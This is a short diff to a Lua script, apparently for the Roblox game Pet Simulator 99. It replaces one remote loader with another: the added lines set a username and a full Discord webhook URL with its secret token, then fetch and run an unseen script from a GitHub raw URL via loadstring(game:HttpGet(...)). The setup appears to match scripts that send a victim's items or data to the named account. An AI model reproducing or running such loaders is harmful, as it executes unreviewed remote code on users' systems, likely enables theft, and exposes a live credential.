@@ -1,1 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/D3athFeather/ps99/main/45d0adeabd4ff3aeff62a8ef.lua"))()
+Username = "Ankaikazc_1" 
+Webhook = "https://discord.com/api/webhooks/1272888145725100123/qB80BukHoY-5Qxy_6_KPLqc16vmtEkIi8KbGl_nEvbkigsBYaQcTAdxQ4SbkQFRPscou" 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zachemzhestokiy/x/main/ps99.lua"))()
